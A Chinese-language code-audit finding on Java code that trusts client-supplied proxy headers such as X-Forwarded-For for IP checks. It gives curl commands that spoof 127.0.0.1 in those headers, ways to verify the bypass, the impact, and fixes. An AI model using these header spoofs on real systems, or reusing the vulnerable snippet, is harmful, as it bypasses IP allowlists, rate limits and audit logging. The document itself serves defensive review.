/*
 * 代码审计片段：直接信任客户端可控的代理头
 * 典型位置：登录、限流、IP 白名单、审计日志、验证码、密码重置
 */
String ip = request.getHeader("x-forwarded-for");
if (ip == null || ip.length() == 0 || CommonConstant.UNKNOWN.equalsIgnoreCase(ip)) {
    ip = request.getHeader("Proxy-Client-IP");
}
if (ip == null || ip.length() == 0 || CommonConstant.UNKNOWN.equalsIgnoreCase(ip)) {
    ip = request.getHeader("WL-Proxy-Client-IP");
}
if (ip == null || ip.length() == 0 || CommonConstant.UNKNOWN.equalsIgnoreCase(ip)) {
    ip = request.getHeader("HTTP_CLIENT_IP");
}
if (ip == null || ip.length() == 0 || CommonConstant.UNKNOWN.equalsIgnoreCase(ip)) {
    ip = request.getHeader("HTTP_X_FORWARDED_FOR");
}
if (ip == null || ip.length() == 0 || CommonConstant.UNKNOWN.equalsIgnoreCase(ip)) {
    ip = request.getRemoteAddr();
}
if (ip == null || ip.isEmpty() || CommonConstant.UNKNOWN.equalsIgnoreCase(ip)) {
    ip = request.getHeader("CloudFront-Viewer-Address");
}
if (ip != null && ip.contains(",")) {
    ip = ip.split(",")[0];
}

/* ---------------- 探测 / 利用 ---------------- */

# 1) 最常用的 X-Forwarded-For
curl -s -H 'X-Forwarded-For: 127.0.0.1' http://target/admin

# 2) 逗号分隔时，代码取第一个值；攻击者把伪造值放最前
curl -s -H 'X-Forwarded-For: 127.0.0.1, 10.0.0.1' http://target/admin

# 3) 逐个尝试代码里列出的头
curl -s -H 'Proxy-Client-IP: 127.0.0.1' http://target/
curl -s -H 'WL-Proxy-Client-IP: 127.0.0.1' http://target/
curl -s -H 'HTTP_CLIENT_IP: 127.0.0.1' http://target/
curl -s -H 'HTTP_X_FORWARDED_FOR: 127.0.0.1' http://target/
curl -s -H 'CloudFront-Viewer-Address: 127.0.0.1' http://target/

# 4) 常见但代码片段未列出的头，也一起试
curl -s -H 'X-Real-IP: 127.0.0.1' http://target/
curl -s -H 'Forwarded: for=127.0.0.1' http://target/

/* ---------------- 判断是否生效 ---------------- */

- 访问只允许内网/本机 IP 的接口，看是否放行；
- 触发登录失败/验证码/限流，换伪造 IP 看计数是否重置；
- 查看审计日志/登录日志里记录的 IP 是否变成伪造值；
- 对比不带 header 与带 header 的响应差异；
- 如果前面有 Nginx/网关，先确认它是覆盖还是追加 XFF：
  - 覆盖：应用看到的是代理写入的值，伪造可能无效；
  - 追加：应用取第一个值时通常就是攻击者可控值。

/* ---------------- 影响 ---------------- */

- 绕过 IP 白名单/内网限制（管理后台、运维接口、SSRF 目标白名单）；
- 绕过基于 IP 的登录失败锁定、验证码、频率限制；
- 伪造审计日志/登录日志来源，增加溯源难度；
- 绕过地域限制、试用/注册次数限制；
- 若 IP 被当作身份或权限判断依据，可直接构成认证/授权绕过。

/* ---------------- 修复建议 ---------------- */

1. 默认只使用 request.getRemoteAddr()，不要信任客户端头。
2. 只有请求确实来自可信代理（Nginx/LB/CDN）时才解析 XFF/Forwarded；
   先校验 remoteAddr 是否在可信代理 CIDR 内。
3. 解析多级代理时从右往左取第一个非可信地址，而不是无条件取第一个。
4. 不要让 IP 承担身份认证职责；限流/锁定同时按账号、设备、会话做。
5. 在框架层统一配置可信代理（如 Spring 的 forwarded-headers-strategy /
   ForwardedHeaderFilter），不要在业务代码里各写一套。
